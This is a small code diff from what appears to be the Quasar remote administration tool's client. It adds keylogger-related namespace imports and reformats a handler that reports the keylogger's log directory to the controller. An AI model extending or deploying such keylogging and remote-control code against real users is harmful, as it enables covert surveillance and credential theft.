@@ -1,5 +1,7 @@
 ﻿using Quasar.Client.Config;
 using Quasar.Common.Messages;
+using Quasar.Common.Messages.Monitoring.KeyLogger;
+using Quasar.Common.Messages.other;
 using Quasar.Common.Networking;
 
 namespace Quasar.Client.Messages
@@ -22,7 +24,7 @@ namespace Quasar.Client.Messages
 
         public void Execute(ISender client, GetKeyloggerLogsDirectory message)
         {
-            client.Send(new GetKeyloggerLogsDirectoryResponse { LogsDirectory = Settings.LOGSPATH });
+            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
         }
     }
 }
